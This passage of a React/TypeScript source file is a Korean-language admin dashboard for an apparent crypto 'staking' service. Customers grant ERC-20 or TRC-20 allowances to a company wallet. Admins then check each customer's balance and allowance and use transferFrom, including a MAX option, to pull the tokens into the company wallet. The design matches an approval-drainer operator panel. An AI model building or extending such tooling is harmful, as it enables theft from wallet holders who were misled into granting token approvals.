"use client";

import { useEffect, useMemo, useState } from "react";
import {
  AlertCircle,
  CheckCircle2,
  ChevronDown,
  ListChecks,
  RefreshCw,
  Trash2,
  Users,
  Wallet,
} from "lucide-react";
import {
  createPublicClient,
  createWalletClient,
  custom,
  formatUnits,
  isAddress,
  parseUnits,
  type Address,
} from "viem";
import { ERC20_ABI } from "@/lib/erc20";
import { formatNumber, shortAddress } from "@/lib/utils";

type StakeStatus = "REQUESTED" | "APPROVED" | "TRANSFERRED" | "SETTLED" | "REJECTED";
type PatchStakeRequest = (
  id: string,
  status: StakeStatus,
  transferTxHash?: string,
  adminNote?: string,
  amount?: string,
) => Promise<void>;
type RecoverStakeRequest = (id: string, amount: string) => Promise<void>;
type DeleteStakeRequest = (id: string) => Promise<void>;
type DeleteUser = (id: string) => Promise<void>;

interface AdminWalletRow {
  evmAddress: string;
  tronAddress: string | null;
}

interface StakeRequestRow {
  id: string;
  sourceNetwork: string;
  sourceSymbol: string;
  sourceName: string;
  receiptSymbol: string;
  platform: string;
  platformUrl: string;
  category: string;
  amount: string;
  amountNumeric: number;
  walletAddress: string | null;
  tronAddress: string | null;
  spenderAddress: string | null;
  tokenAddress: string | null;
  tokenDecimals: number | null;
  approvalRequired: boolean;
  allowanceRaw: string | null;
  approveTxHash: string | null;
  transferTxHash: string | null;
  status: StakeStatus;
  adminNote: string | null;
  createdAt: string;
  updatedAt?: string;
  user: {
    id: string;
    username: string;
    walletAddress: string | null;
    tronAddress: string | null;
  };
}

interface UserSummary {
  key: string;
  userId: string;
  username: string;
  walletAddress: string | null;
  tronAddress: string | null;
  requests: StakeRequestRow[];
  activeCount: number;
  approvedCount: number;
  allowanceCount: number;
  latestRequest: StakeRequestRow | null;
}

interface Eip1193Provider {
  request: (args: { method: string; params?: unknown }) => Promise<unknown>;
  isMetaMask?: boolean;
  providers?: Eip1193Provider[];
}

interface TronTransferContract {
  balanceOf: (owner: string) => { call: () => Promise<unknown> };
  allowance: (
    owner: string,
    spender: string,
  ) => { call: () => Promise<unknown> };
  transferFrom: (
    owner: string,
    receiver: string,
    amount: string,
  ) => { send: (options?: { feeLimit?: number }) => Promise<unknown> };
}

interface TronTransferWeb {
  defaultAddress?: { base58?: string };
  request?: (args: { method: string; params?: unknown }) => Promise<unknown>;
  contract?: {
    (): { at: (contractAddress: string) => Promise<TronTransferContract> };
    (
      abi: unknown,
      contractAddress: string,
    ): TronTransferContract | Promise<TronTransferContract>;
  };
}

interface TronProviderLike {
  request?: (args: { method: string; params?: unknown }) => Promise<unknown>;
  tronWeb?: TronTransferWeb;
}

interface TronWindow {
  tron?: TronProviderLike;
  tronLink?: TronProviderLike;
  safepal?: TronProviderLike;
  tronWeb?: TronTransferWeb;
}

interface RecoverySnapshot {
  balanceRaw: string;
  allowanceRaw: string;
  recoverableRaw: string;
  checkedAt: string;
}

const TRON_ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
const TRC20_TRANSFER_ABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      { name: "_owner", type: "address" },
      { name: "_spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ name: "remaining", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_from", type: "address" },
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ name: "success", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
] as const;

type AdminTab = "members" | "requests" | "wallet";

export function AdminStakingClient() {
  const [adminWallet, setAdminWallet] = useState<AdminWalletRow | null>(null);
  const [requests, setRequests] = useState<StakeRequestRow[]>([]);
  const [evmAddress, setEvmAddress] = useState("");
  const [tronAddress, setTronAddress] = useState("");
  const [recoveryAmounts, setRecoveryAmounts] = useState<Record<string, string>>({});
  const [isLoading, setIsLoading] = useState(true);
  const [message, setMessage] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<AdminTab>("members");

  async function load() {
    setIsLoading(true);
    setError(null);
    try {
      const res = await fetch("/api/admin/staking", { cache: "no-store" });
      const data = (await res.json()) as {
        adminWallet: AdminWalletRow;
        requests: StakeRequestRow[];
        error?: string;
      };
      if (!res.ok) throw new Error(data.error ?? "관리자 데이터를 불러오지 못했습니다.");
      setAdminWallet(data.adminWallet);
      setRequests(data.requests);
      setEvmAddress(data.adminWallet.evmAddress);
      setTronAddress(data.adminWallet.tronAddress ?? "");
    } catch (e) {
      setError(e instanceof Error ? e.message : "관리자 데이터를 불러오지 못했습니다.");
    } finally {
      setIsLoading(false);
    }
  }

  useEffect(() => {
    const id = window.setTimeout(() => {
      void load();
    }, 0);
    return () => window.clearTimeout(id);
  }, []);

  async function saveAdminWallet() {
    setMessage(null);
    setError(null);
    if (!isAddress(evmAddress)) {
      setError("EVM 회사 지갑 주소가 올바르지 않습니다.");
      return;
    }

    try {
      const res = await fetch("/api/admin/staking", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ evmAddress, tronAddress: tronAddress || null }),
      });
      const data = (await res.json()) as { adminWallet: AdminWalletRow; error?: string };
      if (!res.ok) throw new Error(data.error ?? "회사 지갑 저장 실패");
      setAdminWallet(data.adminWallet);
      setMessage("회사 지갑을 저장했습니다.");
    } catch (e) {
      setError(e instanceof Error ? e.message : "회사 지갑 저장 실패");
    }
  }

  async function patchRequest(
    id: string,
    status: StakeStatus,
    transferTxHash?: string,
    adminNote?: string,
    amount?: string,
  ) {
    const res = await fetch("/api/admin/staking", {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id, status, transferTxHash, adminNote, amount }),
    });
    const data = (await res.json()) as { request: StakeRequestRow; error?: string };
    if (!res.ok) throw new Error(data.error ?? "요청 상태 변경 실패");
    setRequests((prev) => prev.map((item) => (item.id === id ? data.request : item)));
  }

  async function recoverRequest(id: string, amount: string) {
    const res = await fetch("/api/admin/staking/recover", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id, amount }),
    });
    const data = (await res.json()) as { request: StakeRequestRow; error?: string };
    if (!res.ok) throw new Error(data.error ?? "온체인 실행 실패");
    setRequests((prev) => prev.map((item) => (item.id === id ? data.request : item)));
  }

  async function deleteRequest(id: string) {
    const res = await fetch(`/api/admin/staking?id=${encodeURIComponent(id)}`, {
      method: "DELETE",
    });
    if (!res.ok) {
      const data = (await res.json().catch(() => ({}))) as { error?: string };
      throw new Error(data.error ?? "요청 삭제 실패");
    }
    setRequests((prev) => prev.filter((item) => item.id !== id));
    setRecoveryAmounts((prev) => {
      if (!(id in prev)) return prev;
      const next = { ...prev };
      delete next[id];
      return next;
    });
    setMessage("요청을 삭제했습니다.");
  }

  async function deleteUser(id: string) {
    const res = await fetch(`/api/admin/users?id=${encodeURIComponent(id)}`, {
      method: "DELETE",
    });
    if (!res.ok) {
      const data = (await res.json().catch(() => ({}))) as { error?: string };
      throw new Error(data.error ?? "회원 삭제 실패");
    }
    setRequests((prev) => prev.filter((item) => item.user.id !== id));
    setMessage("회원을 삭제했습니다.");
  }

  const userSummaries = useMemo(() => buildUserSummaries(requests), [requests]);
  const txEntries = useMemo(() => buildTxLogEntries(requests), [requests]);

  const tabs: { id: AdminTab; label: string; icon: typeof Users; badge?: number }[] = [
    { id: "members", label: "회원 목록", icon: Users, badge: userSummaries.length },
    { id: "requests", label: "TX 로그", icon: ListChecks, badge: txEntries.length },
    { id: "wallet", label: "회사 지갑", icon: Wallet },
  ];

  return (
    <div className="min-h-[calc(100vh-4rem)] bg-background text-foreground">
      <div className="mx-auto max-w-6xl px-4 py-10 sm:px-6 lg:px-8">
        <div className="flex flex-col gap-4 sm:flex-row sm:items-end sm:justify-between">
          <div>
            <p className="text-[11px] font-semibold uppercase tracking-widest text-muted">
              관리자
            </p>
            <h1 className="mt-1 text-2xl font-extrabold tracking-tight">
              스테이킹 관리
            </h1>
          </div>
          <button
            type="button"
            onClick={load}
            className="inline-flex h-10 items-center justify-center gap-2 rounded-full border border-black/10 bg-white px-4 text-xs font-bold text-foreground/80 transition hover:border-foreground/30"
          >
            <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
            새로고침
          </button>
        </div>

        <div className="mt-6 flex gap-1 border-b border-black/5">
          {tabs.map((tab) => {
            const Icon = tab.icon;
            const active = activeTab === tab.id;
            return (
              <button
                key={tab.id}
                type="button"
                onClick={() => setActiveTab(tab.id)}
                className={`relative inline-flex items-center gap-2 px-4 py-3 text-xs font-extrabold transition ${
                  active ? "text-accent-strong" : "text-foreground/60 hover:text-foreground"
                }`}
              >
                <Icon className="h-4 w-4" />
                {tab.label}
                {typeof tab.badge === "number" && tab.badge > 0 ? (
                  <span
                    className={`rounded-full px-2 py-0.5 text-[10px] font-bold ${
                      active
                        ? "bg-accent-strong/15 text-accent-strong"
                        : "bg-black/5 text-foreground/60"
                    }`}
                  >
                    {tab.badge}
                  </span>
                ) : null}
                {active && (
                  <span className="absolute inset-x-2 -bottom-px h-0.5 rounded-full bg-accent-strong" />
                )}
              </button>
            );
          })}
        </div>

        {error && (
          <div className="mt-4 flex items-start gap-2 rounded-xl border border-red-200 bg-red-50 p-3 text-xs text-red-700">
            <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
            <p>{error}</p>
          </div>
        )}
        {message && (
          <div className="mt-4 flex items-start gap-2 rounded-xl border border-emerald-200 bg-emerald-50 p-3 text-xs text-emerald-700">
            <CheckCircle2 className="mt-0.5 h-4 w-4 shrink-0" />
            <p>{message}</p>
          </div>
        )}

        <div className="mt-6">
          {activeTab === "members" && (
            <MembersTab
              userSummaries={userSummaries}
              adminWallet={adminWallet}
              isLoading={isLoading}
              recoveryAmounts={recoveryAmounts}
              onRecoveryAmountChange={(id, value) =>
                setRecoveryAmounts((prev) => ({ ...prev, [id]: value }))
              }
              onStatus={patchRequest}
              onRecover={recoverRequest}
              onDeleteRequest={deleteRequest}
              onDeleteUser={deleteUser}
            />
          )}

          {activeTab === "requests" && (
            <TxLogTab entries={txEntries} isLoading={isLoading} />
          )}

          {activeTab === "wallet" && (
            <WalletTab
              evmAddress={evmAddress}
              tronAddress={tronAddress}
              onEvmChange={setEvmAddress}
              onTronChange={setTronAddress}
              onSave={saveAdminWallet}
            />
          )}
        </div>
      </div>
    </div>
  );
}

function MembersTab({
  userSummaries,
  adminWallet,
  isLoading,
  recoveryAmounts,
  onRecoveryAmountChange,
  onStatus,
  onRecover,
  onDeleteRequest,
  onDeleteUser,
}: {
  userSummaries: UserSummary[];
  adminWallet: AdminWalletRow | null;
  isLoading: boolean;
  recoveryAmounts: Record<string, string>;
  onRecoveryAmountChange: (id: string, value: string) => void;
  onStatus: PatchStakeRequest;
  onRecover: RecoverStakeRequest;
  onDeleteRequest: DeleteStakeRequest;
  onDeleteUser: DeleteUser;
}) {
  if (!isLoading && userSummaries.length === 0) {
    return (
      <div className="rounded-3xl border border-black/5 bg-white p-8 text-center text-sm text-muted">
        아직 회원 요청이 없습니다.
      </div>
    );
  }

  return (
    <div className="space-y-3">
      {userSummaries.map((user) => (
        <MemberCard
          key={user.key}
          user={user}
          adminWallet={adminWallet}
          recoveryAmounts={recoveryAmounts}
          onRecoveryAmountChange={onRecoveryAmountChange}
          onStatus={onStatus}
          onRecover={onRecover}
          onDeleteRequest={onDeleteRequest}
          onDeleteUser={onDeleteUser}
        />
      ))}
    </div>
  );
}

function MemberCard({
  user,
  adminWallet,
  recoveryAmounts,
  onRecoveryAmountChange,
  onStatus,
  onRecover,
  onDeleteRequest,
  onDeleteUser,
}: {
  user: UserSummary;
  adminWallet: AdminWalletRow | null;
  recoveryAmounts: Record<string, string>;
  onRecoveryAmountChange: (id: string, value: string) => void;
  onStatus: PatchStakeRequest;
  onRecover: RecoverStakeRequest;
  onDeleteRequest: DeleteStakeRequest;
  onDeleteUser: DeleteUser;
}) {
  const [isExpanded, setIsExpanded] = useState(false);
  const [isDeleting, setIsDeleting] = useState(false);
  const [deleteError, setDeleteError] = useState<string | null>(null);
  const latest = user.latestRequest;
  const sortedRequests = useMemo(
    () =>
      [...user.requests].sort(
        (a, b) =>
          new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime(),
      ),
    [user.requests],
  );

  async function handleDeleteUser() {
    const ok = window.confirm(
      `"${user.username}" 회원과 모든 요청 ${user.requests.length}건을 삭제할까요?\n복구할 수 없습니다.`,
    );
    if (!ok) return;
    setIsDeleting(true);
    setDeleteError(null);
    try {
      await onDeleteUser(user.userId);
    } catch (e) {
      setDeleteError(e instanceof Error ? e.message : "회원 삭제 실패");
      setIsDeleting(false);
    }
  }

  return (
    <section className="overflow-hidden rounded-3xl border border-black/5 bg-white">
      <div className="flex items-stretch">
        <button
          type="button"
          onClick={() => setIsExpanded((prev) => !prev)}
          className="flex flex-1 items-start justify-between gap-3 p-5 text-left transition hover:bg-black/[0.02]"
          aria-expanded={isExpanded}
        >
          <div className="min-w-0 flex-1">
            <div className="flex items-center gap-2">
              <h3 className="text-base font-extrabold text-foreground">
                {user.username}
              </h3>
              <span className="rounded-full border border-black/10 px-2 py-0.5 text-[10px] font-bold text-foreground/60">
                {user.requests.length}건
              </span>
            </div>
            <div className="mt-1.5 flex flex-col gap-1 text-[11px] font-mono text-muted sm:flex-row sm:gap-4">
              <span>
                EVM:{" "}
                <span className="text-foreground">
                  {user.walletAddress ? shortAddress(user.walletAddress) : "-"}
                </span>
              </span>
              <span>
                TRON:{" "}
                <span className="text-foreground">
                  {user.tronAddress ? shortAddress(user.tronAddress) : "-"}
                </span>
              </span>
            </div>
            {latest && (
              <p className="mt-2 text-[11px] text-muted">
                최근 계약{" "}
                <span className="font-bold text-foreground">
                  {latest.sourceSymbol} → {latest.receiptSymbol}
                </span>{" "}
                ·{" "}
                <span className="font-mono text-foreground">
                  {formatNumber(latest.amountNumeric, 6)} {latest.sourceSymbol}
                </span>{" "}
                ·{" "}
                <span className="font-mono">{formatDate(latest.createdAt)}</span>{" "}
                ·{" "}
                <span className="rounded-full border border-black/10 px-1.5 py-0.5 text-[10px] font-bold text-foreground/70">
                  {formatStatusLabel(latest.status)}
                </span>
              </p>
            )}
          </div>
          <ChevronDown
            className={`mt-1 h-5 w-5 shrink-0 text-foreground/60 transition ${
              isExpanded ? "rotate-180" : ""
            }`}
          />
        </button>
        <button
          type="button"
          onClick={handleDeleteUser}
          disabled={isDeleting}
          aria-label={`${user.username} 회원 삭제`}
          className="flex items-center justify-center px-4 text-red-500 transition hover:bg-red-50 disabled:cursor-wait disabled:opacity-60"
        >
          <Trash2 className="h-4 w-4" />
        </button>
      </div>

      {deleteError && (
        <div className="border-t border-red-200 bg-red-50 px-5 py-3 text-xs text-red-700">
          {deleteError}
        </div>
      )}

      {isExpanded && (
        <div className="border-t border-black/5 bg-black/[0.015] p-5">
          {sortedRequests.length === 0 ? (
            <p className="rounded-2xl bg-white p-4 text-xs text-muted">
              계약 내역이 없습니다.
            </p>
          ) : (
            <ul className="space-y-3">
              {sortedRequests.map((request) => (
                <MemberRequestEntry
                  key={`${request.id}-${request.amount}`}
                  request={request}
                  adminWallet={adminWallet}
                  recoveryAmount={
                    recoveryAmounts[request.id] ?? request.amount
                  }
                  onRecoveryAmountChange={(value) =>
                    onRecoveryAmountChange(request.id, value)
                  }
                  onStatus={onStatus}
                  onRecover={onRecover}
                  onDelete={onDeleteRequest}
                />
              ))}
            </ul>
          )}
        </div>
      )}
    </section>
  );
}

function MemberRequestEntry({
  request,
  adminWallet,
  recoveryAmount,
  onRecoveryAmountChange,
  onStatus,
  onRecover,
  onDelete,
}: {
  request: StakeRequestRow;
  adminWallet: AdminWalletRow | null;
  recoveryAmount: string;
  onRecoveryAmountChange: (value: string) => void;
  onStatus: PatchStakeRequest;
  onRecover: RecoverStakeRequest;
  onDelete: DeleteStakeRequest;
}) {
  const [snapshot, setSnapshot] = useState<RecoverySnapshot | null>(null);
  const [isChecking, setIsChecking] = useState(false);
  const [isRecovering, setIsRecovering] = useState(false);
  const [isUpdating, setIsUpdating] = useState(false);
  const [isDeleting, setIsDeleting] = useState(false);
  const [requestAmount, setRequestAmount] = useState(request.amount);
  const [localError, setLocalError] = useState<string | null>(null);

  const decimals = request.tokenDecimals ?? 18;
  const isEvm = Boolean(request.tokenAddress?.startsWith("0x"));
  const customerWallet = isEvm ? request.walletAddress : request.tronAddress;
  const companyWallet = isEvm
    ? adminWallet?.evmAddress ?? null
    : adminWallet?.tronAddress ?? null;
  const expectedSpender =
    request.spenderAddress ?? resolveRequestSpender(request, adminWallet);
  const isApprovalToken = isTokenApprovalRequest(request);
  const isRecoverable = isRecoverableRequest(request);
  const isFinal = request.status === "SETTLED" || request.status === "REJECTED";

  const balanceLabel = snapshot ? formatRawToken(snapshot.balanceRaw, decimals) : "-";
  const allowanceLabel = snapshot
    ? formatRawToken(snapshot.allowanceRaw, decimals)
    : request.allowanceRaw && request.allowanceRaw !== "0" && request.tokenDecimals !== null
      ? formatRawToken(request.allowanceRaw, request.tokenDecimals)
      : "-";
  const recoverableLabel = snapshot
    ? formatRawToken(snapshot.recoverableRaw, decimals)
    : "-";
  const snapshotRecoverableRaw = snapshot ? BigInt(snapshot.recoverableRaw) : BigInt(0);

  const amountUnits = toUnits(recoveryAmount, decimals);
  const allowanceUnits = toBigInt(request.allowanceRaw);
  const hasRecordedAllowance = allowanceUnits !== null && allowanceUnits > BigInt(0);
  const hasEnoughRecordedAllowance =
    amountUnits !== null && (!hasRecordedAllowance || allowanceUnits >= amountUnits);
  const hasApproval = hasApprovalRecord(request);
  const savedWalletMatchesSpender = Boolean(
    expectedSpender &&
      companyWallet &&
      (isEvm
        ? companyWallet.toLowerCase() === expectedSpender.toLowerCase()
        : sameTronAddress(companyWallet, expectedSpender)),
  );
  const canRecover = Boolean(
    isRecoverable &&
      adminWallet &&
      request.tokenAddress &&
      request.tokenDecimals !== null &&
      expectedSpender &&
      savedWalletMatchesSpender &&
      hasApproval &&
      amountUnits !== null &&
      amountUnits > BigInt(0) &&
      hasEnoughRecordedAllowance,
  );

  async function checkBalance() {
    setIsChecking(true);
    setLocalError(null);
    try {
      if (!request.tokenAddress || request.tokenDecimals === null) {
        throw new Error("토큰 정보를 찾지 못했습니다.");
      }
      if (!expectedSpender) {
        throw new Error("회사 승인 지갑 주소가 없습니다.");
      }
      const next = isEvm
        ? await readErc20RecoverySnapshot({
            tokenAddress: request.tokenAddress,
            owner: request.walletAddress,
            spender: expectedSpender,
          })
        : await readTronRecoverySnapshot({
            tokenAddress: request.tokenAddress,
            owner: request.tronAddress,
            spender: expectedSpender,
          });
      setSnapshot(next);
    } catch (e) {
      setLocalError(e instanceof Error ? e.message : "잔고 확인 실패");
    } finally {
      setIsChecking(false);
    }
  }

  async function approveRequest() {
    setIsUpdating(true);
    setLocalError(null);
    try {
      await onStatus(request.id, "APPROVED", undefined, "allowance 승인 확인");
    } catch (e) {
      setLocalError(e instanceof Error ? e.message : "승인 확인 실패");
    } finally {
      setIsUpdating(false);
    }
  }

  async function settle() {
    setIsUpdating(true);
    setLocalError(null);
    try {
      await onStatus(request.id, "SETTLED");
    } catch (e) {
      setLocalError(e instanceof Error ? e.message : "정산 상태 변경 실패");
    } finally {
      setIsUpdating(false);
    }
  }

  async function recover() {
    if (!canRecover || amountUnits === null) return;
    setIsRecovering(true);
    setLocalError(null);
    try {
      await onRecover(request.id, recoveryAmount);
    } catch (e) {
      try {
        const txHash = await recoverWithBrowserWallet({
          request,
          adminWallet,
          amountUnits,
        });
        await onStatus(
          request.id,
          "TRANSFERRED",
          txHash,
          `확장 지갑 서명 실행: ${recoveryAmount}`,
        );
      } catch (browserError) {
        setLocalError(
          formatRecoveryFailureMessage({
            isEvmToken: isEvm,
            serverMessage: e instanceof Error ? e.message : "서버 실행 실패",
            walletMessage:
              browserError instanceof Error
                ? browserError.message
                : "확장 지갑 실행 실패",
          }),
        );
      }
    } finally {
      setIsRecovering(false);
    }
  }

  async function applyMax() {
    if (!snapshot) return;
    onRecoveryAmountChange(formatUnits(BigInt(snapshot.recoverableRaw), decimals));
  }

  async function updateAmount() {
    const nextAmount = requestAmount.trim();
    const nextAmountNumber = Number(nextAmount);
    if (!Number.isFinite(nextAmountNumber) || nextAmountNumber <= 0) {
      setLocalError("조정할 요청 수량을 올바르게 입력해주세요.");
      return;
    }
    setIsUpdating(true);
    setLocalError(null);
    try {
      await onStatus(
        request.id,
        request.status,
        undefined,
        `요청 수량 조정: ${request.amount} -> ${nextAmount}`,
        nextAmount,
      );
    } catch (e) {
      setLocalError(e instanceof Error ? e.message : "요청 수량 조정 실패");
    } finally {
      setIsUpdating(false);
    }
  }

  async function deleteEntry() {
    const ok = window.confirm(
      `이 요청(${request.sourceSymbol} → ${request.receiptSymbol}, ${formatNumber(request.amountNumeric, 6)} ${request.sourceSymbol})을 삭제할까요?`,
    );
    if (!ok) return;
    setIsDeleting(true);
    setLocalError(null);
    try {
      await onDelete(request.id);
    } catch (e) {
      setLocalError(e instanceof Error ? e.message : "요청 삭제 실패");
      setIsDeleting(false);
    }
  }

  const warnings: string[] = [];
  if (isRecoverable) {
    if (!hasApproval) warnings.push("고객 승인 기록이 없습니다.");
    else if (expectedSpender && !savedWalletMatchesSpender)
      warnings.push("저장된 회사 지갑이 고객이 승인한 지갑과 다릅니다.");
    else if (hasRecordedAllowance && !hasEnoughRecordedAllowance)
      warnings.push("입력한 수량이 고객이 승인한 수량보다 큽니다.");
  }

  return (
    <li className="space-y-3 rounded-2xl border border-black/5 bg-white p-4">
      <div className="flex flex-wrap items-start justify-between gap-2">
        <div className="min-w-0">
          <p className="text-sm font-extrabold text-foreground">
            {request.sourceSymbol} → {request.receiptSymbol}
            <span className="ml-2 text-[11px] font-bold text-muted">
              {request.sourceNetwork}
            </span>
          </p>
          <p className="mt-0.5 text-[11px] text-muted">
            <span className="font-mono text-foreground">
              {formatNumber(request.amountNumeric, 6)} {request.sourceSymbol}
            </span>
            <span className="mx-1.5">·</span>
            <span className="font-mono">{formatDate(request.createdAt)}</span>
          </p>
        </div>
        <span className="rounded-full border border-black/10 px-2.5 py-1 text-[10px] font-bold text-foreground/60">
          {formatStatusLabel(request.status)}
        </span>
      </div>

      {isApprovalToken && (
        <>
          <div className="rounded-xl border border-black/5 bg-black/[0.02] p-3">
            <div className="mb-2 flex items-center justify-between gap-2">
              <p className="text-[10px] font-bold uppercase tracking-widest text-muted">
                온체인 현황
              </p>
              <button
                type="button"
                onClick={checkBalance}
                disabled={isChecking}
                className="inline-flex items-center gap-1 rounded-full border border-black/10 bg-white px-2.5 py-1 text-[10px] font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-wait disabled:opacity-60"
              >
                <RefreshCw className={`h-3 w-3 ${isChecking ? "animate-spin" : ""}`} />
                {isChecking ? "확인 중" : snapshot ? "다시 확인" : "잔고 확인"}
              </button>
            </div>
            <div className="grid grid-cols-3 gap-2">
              <RequestStat label="잔고" value={`${balanceLabel} ${request.sourceSymbol}`} />
              <RequestStat label="승인된 수량" value={`${allowanceLabel} ${request.sourceSymbol}`} />
              <RequestStat
                label="회수 가능"
                value={`${recoverableLabel} ${request.sourceSymbol}`}
                tone="emerald"
              />
            </div>
          </div>

          {isRecoverable && (
            <div className="space-y-2 rounded-xl border border-accent-strong/20 bg-accent-strong/[0.04] p-3">
              <div className="flex flex-wrap items-end gap-2">
                <label className="min-w-[140px] flex-1">
                  <span className="text-[10px] font-semibold uppercase tracking-widest text-muted">
                    받을 수량
                  </span>
                  <div className="mt-1 flex gap-1">
                    <input
                      value={recoveryAmount}
                      onChange={(e) => onRecoveryAmountChange(e.target.value)}
                      inputMode="decimal"
                      className="w-full rounded-lg border border-black/10 bg-white px-3 py-2 font-mono text-xs font-semibold text-foreground outline-none transition focus:border-accent-strong focus:ring-2 focus:ring-accent-strong/20"
                    />
                    {snapshot && snapshotRecoverableRaw > BigInt(0) && (
                      <button
                        type="button"
                        onClick={applyMax}
                        className="rounded-lg border border-black/10 bg-white px-2 text-[10px] font-extrabold text-foreground/80 transition hover:border-foreground/30"
                      >
                        MAX
                      </button>
                    )}
                  </div>
                </label>
                <button
                  type="button"
                  onClick={approveRequest}
                  disabled={isRecovering || isUpdating || !hasApproval || request.status !== "REQUESTED"}
                  className="rounded-lg border border-black/10 bg-white px-3 py-2 text-xs font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-not-allowed disabled:opacity-50"
                >
                  승인 확인
                </button>
                <button
                  type="button"
                  onClick={recover}
                  disabled={!canRecover || isRecovering}
                  className="rounded-lg bg-accent-strong px-4 py-2 text-xs font-extrabold text-white transition hover:bg-accent-strong/90 disabled:cursor-not-allowed disabled:opacity-50"
                >
                  {isRecovering ? "처리 중..." : "받기 실행"}
                </button>
              </div>

              {warnings.map((warning) => (
                <div
                  key={warning}
                  className="rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-[11px] text-amber-700"
                >
                  {warning}
                </div>
              ))}
            </div>
          )}

          <div className="grid gap-1 rounded-xl bg-black/[0.02] px-3 py-2 text-[11px] text-muted sm:grid-cols-2">
            <p>
              고객 지갑:{" "}
              <span className="font-mono text-foreground">
                {customerWallet ? shortAddress(customerWallet) : "-"}
              </span>
            </p>
            <p>
              회사 지갑:{" "}
              <span className="font-mono text-foreground">
                {companyWallet ? shortAddress(companyWallet) : "-"}
              </span>
            </p>
          </div>
        </>
      )}

      <details className="rounded-xl border border-black/5 bg-black/[0.02] p-3 text-xs text-muted">
        <summary className="cursor-pointer font-bold text-foreground/70">관리</summary>
        <div className="mt-3 space-y-3">
          <div className="flex flex-wrap justify-end gap-2">
            <button
              type="button"
              onClick={settle}
              disabled={isUpdating || isDeleting || isFinal}
              className="rounded-lg border border-black/10 bg-white px-3 py-1.5 text-[11px] font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-not-allowed disabled:opacity-50"
            >
              {request.status === "SETTLED" ? "정산 완료" : "정산 완료 처리"}
            </button>
            <button
              type="button"
              onClick={deleteEntry}
              disabled={isDeleting || isUpdating}
              className="inline-flex items-center gap-1 rounded-lg border border-red-200 bg-white px-3 py-1.5 text-[11px] font-extrabold text-red-600 transition hover:bg-red-50 disabled:cursor-wait disabled:opacity-60"
            >
              <Trash2 className="h-3 w-3" />
              {isDeleting ? "삭제 중..." : "이 요청 삭제"}
            </button>
          </div>
          <div className="grid gap-2 sm:grid-cols-[1fr_auto] sm:items-end">
            <label className="block">
              <span className="text-[10px] font-semibold uppercase tracking-widest text-muted">
                예치 수량 수정
              </span>
              <input
                value={requestAmount}
                onChange={(e) => setRequestAmount(e.target.value)}
                inputMode="decimal"
                className="mt-1 w-full rounded-lg border border-black/10 bg-white px-3 py-2 font-mono text-xs font-semibold text-foreground outline-none transition focus:border-accent-strong focus:ring-2 focus:ring-accent-strong/20"
              />
            </label>
            <button
              type="button"
              onClick={updateAmount}
              disabled={isUpdating || isDeleting || requestAmount.trim() === request.amount}
              className="rounded-lg border border-black/10 bg-white px-3 py-2 text-[11px] font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-not-allowed disabled:opacity-50"
            >
              수량 저장
            </button>
          </div>
        </div>
      </details>

      {localError && (
        <div className="rounded-xl border border-red-200 bg-red-50 p-3 text-xs text-red-700">
          {localError}
        </div>
      )}
    </li>
  );
}

function RequestStat({
  label,
  value,
  tone,
}: {
  label: string;
  value: string;
  tone?: "emerald";
}) {
  return (
    <div
      className={`rounded-lg border p-2 ${
        tone === "emerald"
          ? "border-emerald-200/60 bg-emerald-50"
          : "border-black/5 bg-white"
      }`}
    >
      <p
        className={`text-[10px] font-bold uppercase tracking-widest ${
          tone === "emerald" ? "text-emerald-700" : "text-muted"
        }`}
      >
        {label}
      </p>
      <p
        className={`mt-1 truncate font-mono text-xs font-extrabold ${
          tone === "emerald" ? "text-emerald-700" : "text-foreground"
        }`}
      >
        {value}
      </p>
    </div>
  );
}

function WalletTab({
  evmAddress,
  tronAddress,
  onEvmChange,
  onTronChange,
  onSave,
}: {
  evmAddress: string;
  tronAddress: string;
  onEvmChange: (value: string) => void;
  onTronChange: (value: string) => void;
  onSave: () => void;
}) {
  return (
    <section className="mx-auto max-w-2xl rounded-3xl border border-black/5 bg-white p-6">
      <div className="flex items-center gap-3">
        <div className="rounded-full bg-black/5 p-2">
          <Wallet className="h-4 w-4 text-accent-strong" />
        </div>
        <div>
          <h2 className="text-base font-extrabold text-foreground">
            회사 지갑
          </h2>
          <p className="mt-0.5 text-xs text-muted">
            회수한 토큰을 받을 회사 지갑 주소
          </p>
        </div>
      </div>

      <div className="mt-5 space-y-4">
        <label className="block">
          <span className="text-[10px] font-semibold uppercase tracking-widest text-muted">
            회사 EVM 지갑
          </span>
          <input
            value={evmAddress}
            onChange={(e) => onEvmChange(e.target.value)}
            className="mt-1.5 w-full rounded-xl border border-black/10 bg-white px-3 py-2.5 font-mono text-xs font-semibold text-foreground outline-none transition focus:border-accent-strong focus:ring-2 focus:ring-accent-strong/20"
          />
        </label>
        <label className="block">
          <span className="text-[10px] font-semibold uppercase tracking-widest text-muted">
            회사 TRON 지갑
          </span>
          <input
            value={tronAddress}
            onChange={(e) => onTronChange(e.target.value)}
            placeholder="선택"
            className="mt-1.5 w-full rounded-xl border border-black/10 bg-white px-3 py-2.5 font-mono text-xs font-semibold text-foreground outline-none transition focus:border-accent-strong focus:ring-2 focus:ring-accent-strong/20"
          />
        </label>
        <button
          type="button"
          onClick={onSave}
